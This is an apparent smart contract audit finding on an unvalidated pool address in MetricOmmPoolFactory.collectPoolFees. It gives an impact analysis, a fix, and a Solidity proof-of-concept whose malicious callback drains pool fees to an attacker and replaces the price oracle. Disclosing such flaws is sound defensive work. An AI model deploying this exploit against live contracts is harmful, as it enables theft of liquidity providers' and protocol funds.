### Title
Unvalidated `pool` Address in `collectPoolFees` Lets Any Caller Execute Arbitrary Code as the Factory — (`metric-core/contracts/MetricOmmPoolFactory.sol`)

### Summary

`MetricOmmPoolFactory.collectPoolFees(address pool)` is a permissionless external function that calls `IMetricOmmPoolCollectFees(pool).collectFees(...)` with the factory as `msg.sender`, without verifying that `pool` is a registered pool. Because all `onlyFactory` guards on real pools check `msg.sender == FACTORY`, a malicious contract passed as `pool` can re-use the factory's `msg.sender` context to invoke any `onlyFactory` function on any legitimate pool — including draining accumulated fees to an attacker-controlled address and replacing the price provider with a malicious one.

### Finding Description

`collectPoolFees` at line 379 of `MetricOmmPoolFactory.sol` is declared `external nonReentrant` with no access control and no `isPool(pool)` guard:

```solidity
function collectPoolFees(address pool) external override nonReentrant {
    PoolFeeConfig memory c = poolFeeConfig[pool];
    IMetricOmmPoolCollectFees(pool)
      .collectFees(
        c.protocolSpreadFeeE6,
        c.adminSpreadFeeE6,
        c.protocolNotionalFeeE8,
        c.adminNotionalFeeE8,
        poolAdminFeeDestination[pool]
      );
}
```

For an unregistered address, `poolFeeConfig[pool]` returns all-zero values and `poolAdminFeeDestination[pool]` returns `address(0)`. The factory then calls `pool.collectFees(0, 0, 0, 0, address(0))` with `msg.sender == factory`.

Inside the malicious contract's `collectFees`, `msg.sender` is the factory. The malicious contract can therefore call any `onlyFactory`-gated function on a real pool:

- `realPool.collectFees(0, 1, 0, 1, attackerAddress)` — passes `adminSpreadFeeE6_ = 1`, `adminNotionalFeeE8_ = 1`, `protocolSpreadFeeE6_ = 0`, `protocolNotionalFeeE8_ = 0`. The fee split math in `collectFees` then routes 100 % of both spread surplus and notional fee accumulators to `attackerAddress`.
- `realPool.setPriceProvider(maliciousProvider)` — bypasses the factory's timelock and `_validatePriceProvider` check entirely, replacing the oracle with an arbitrary address.
- `realPool.setPause(2)` — protocol-pauses any pool without owner authority.
- `realPool.setPoolFees(maxFee, maxFee)` — sets fees to the maximum allowed value.

The factory's own `nonReentrant` guard (transient storage on the factory) does not block the malicious contract from calling `realPool.*` because those calls do not re-enter the factory.

### Impact Explanation

**Direct loss of protocol and LP fees**: All spread surplus and notional fee accumulators held in any pool can be drained to an attacker-controlled address in a single transaction.

**Price oracle hijack**: `setPriceProvider` has no validation on the pool side; the factory's `_validatePriceProvider` check is bypassed. A malicious oracle returning extreme bid/ask values causes swappers to receive far less than the fair price, or causes the pool to revert on every swap, making it permanently unusable.

**Unauthorized pause**: Any pool can be protocol-paused, blocking all swaps and liquidity operations for all users.

### Likelihood Explanation

The function is permissionless — any EOA or contract can call it with a crafted address. No special role, no front-running dependency, and no capital is required. The attack is a single transaction.

### Recommendation

Add a registered-pool guard at the top of `collectPoolFees` (and any other permissionless function that calls into an arbitrary `pool` address):

```solidity
function collectPoolFees(address pool) external override nonReentrant {
    if (poolToIdx[pool] == 0) revert NotRegisteredPool();
    ...
}
```

The factory already exposes `isPool(address pool)` which checks `poolToIdx[pool] != 0`. Apply the same check before any external call to a caller-supplied `pool` address.

### Proof of Concept

```solidity
contract MaliciousPool {
    address immutable realPool;
    address immutable attacker;

    constructor(address _realPool, address _attacker) {
        realPool = _realPool;
        attacker = _attacker;
    }

    // Implements IMetricOmmPoolCollectFees
    function collectFees(
        uint256, uint256, uint256, uint256, address
    ) external {
        // msg.sender == factory here
        // 1. Drain all fees: adminSpreadFeeE6=1, protocolSpreadFeeE6=0 → 100% to attacker
        IMetricOmmPoolCollectFees(realPool).collectFees(0, 1, 0, 1, attacker);
        // 2. Replace oracle with malicious provider
        IMetricOmmPoolFactoryActions(realPool).setPriceProvider(address(new MaliciousOracle()));
    }
}

// Attack:
// factory.collectPoolFees(address(new MaliciousPool(realPool, attacker)));
```

The factory calls `MaliciousPool.collectFees(...)` with `msg.sender == factory`. The malicious contract then calls `realPool.collectFees(0, 1, 0, 1, attacker)` — which passes `onlyFactory` — routing all accumulated fees to the attacker, and calls `realPool.setPriceProvider(maliciousOracle)` to corrupt future swap pricing. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L149-151)
```text
  function isPool(address pool) external view override returns (bool) {
    return poolToIdx[pool] != 0;
  }
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L379-389)
```text
  function collectPoolFees(address pool) external override nonReentrant {
    PoolFeeConfig memory c = poolFeeConfig[pool];
    IMetricOmmPoolCollectFees(pool)
      .collectFees(
        c.protocolSpreadFeeE6,
        c.adminSpreadFeeE6,
        c.protocolNotionalFeeE8,
        c.adminNotionalFeeE8,
        poolAdminFeeDestination[pool]
      );
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L169-172)
```text
  modifier onlyFactory() {
    _checkFactory();
    _;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L364-434)
```text
  /// @inheritdoc IMetricOmmPoolCollectFees
  function collectFees(
    uint256 protocolSpreadFeeE6_,
    uint256 adminSpreadFeeE6_,
    uint256 protocolNotionalFeeE8_,
    uint256 adminNotionalFeeE8_,
    address adminFeeDestination_
  ) external onlyFactory nonReentrant(PoolActions.COLLECT_FEES) {
    uint256 spreadSumE6;
    uint256 notionalSumE8;
    unchecked {
      spreadSumE6 = protocolSpreadFeeE6_ + adminSpreadFeeE6_;
      notionalSumE8 = protocolNotionalFeeE8_ + adminNotionalFeeE8_;
      if (spreadSumE6 == 0 && notionalSumE8 == 0) {
        return;
      }
    }

    uint256 notionalFee0AmountScaled = notionalFeeToken0Scaled;
    uint256 notionalFee1AmountScaled = notionalFeeToken1Scaled;

    uint256 surplus0Scaled =
      balance0() * TOKEN_0_SCALE_MULTIPLIER - uint256(binTotals.scaledToken0) - notionalFee0AmountScaled;
    uint256 surplus1Scaled =
      balance1() * TOKEN_1_SCALE_MULTIPLIER - uint256(binTotals.scaledToken1) - notionalFee1AmountScaled;

    unchecked {
      uint256 spreadFee0ToAdminScaled = spreadSumE6 == 0 ? 0 : (surplus0Scaled * adminSpreadFeeE6_) / spreadSumE6;
      uint256 spreadFee1ToAdminScaled = spreadSumE6 == 0 ? 0 : (surplus1Scaled * adminSpreadFeeE6_) / spreadSumE6;

      uint256 spreadFee0ToProtocolScaled = spreadSumE6 == 0 ? 0 : (surplus0Scaled * protocolSpreadFeeE6_) / spreadSumE6;
      uint256 spreadFee1ToProtocolScaled = spreadSumE6 == 0 ? 0 : (surplus1Scaled * protocolSpreadFeeE6_) / spreadSumE6;

      uint256 notionalFee0ToAdminScaled =
        notionalSumE8 == 0 ? 0 : (notionalFee0AmountScaled * adminNotionalFeeE8_) / notionalSumE8;
      uint256 notionalFee1ToAdminScaled =
        notionalSumE8 == 0 ? 0 : (notionalFee1AmountScaled * adminNotionalFeeE8_) / notionalSumE8;

      uint256 notionalFee0ToProtocolScaled = notionalFee0AmountScaled - notionalFee0ToAdminScaled;
      uint256 notionalFee1ToProtocolScaled = notionalFee1AmountScaled - notionalFee1ToAdminScaled;

      uint256 totalFee0ToAdminScaled = spreadFee0ToAdminScaled + notionalFee0ToAdminScaled;
      uint256 totalFee1ToAdminScaled = spreadFee1ToAdminScaled + notionalFee1ToAdminScaled;

      uint256 totalFee0ToProtocolScaled = spreadFee0ToProtocolScaled + notionalFee0ToProtocolScaled;
      uint256 totalFee1ToProtocolScaled = spreadFee1ToProtocolScaled + notionalFee1ToProtocolScaled;

      (uint256 totalFee0ToAdmin, uint256 totalFee1ToAdmin) =
        deltasScaledToExternal(totalFee0ToAdminScaled, totalFee1ToAdminScaled, Math.Rounding.Floor);
      (uint256 totalFee0ToProtocol, uint256 totalFee1ToProtocol) =
        deltasScaledToExternal(totalFee0ToProtocolScaled, totalFee1ToProtocolScaled, Math.Rounding.Floor);

      if (totalFee0ToAdmin > 0) {
        transferToken0(adminFeeDestination_, totalFee0ToAdmin);
      }
      if (totalFee1ToAdmin > 0) {
        transferToken1(adminFeeDestination_, totalFee1ToAdmin);
      }
      if (totalFee0ToProtocol > 0) {
        transferToken0(FACTORY, totalFee0ToProtocol);
      }
      if (totalFee1ToProtocol > 0) {
        transferToken1(FACTORY, totalFee1ToProtocol);
      }

      notionalFeeToken0Scaled = 0;
      notionalFeeToken1Scaled = 0;

      emit ProtocolFeesCollected(totalFee0ToProtocol, totalFee1ToProtocol, totalFee0ToAdmin, totalFee1ToAdmin);
    }
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L477-480)
```text
  function setPriceProvider(address newPriceProvider) external onlyFactory {
    priceProvider = newPriceProvider;
    emit PriceProviderUpdated(newPriceProvider);
  }
```
